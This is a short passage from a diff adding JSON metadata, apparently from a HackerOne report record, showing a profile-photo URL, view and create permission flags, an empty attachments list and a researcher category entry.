+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/d7b0d969b6320751e1c58b9e3efff1e228054ee3d8eade5c51c4c79b25513a9c"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
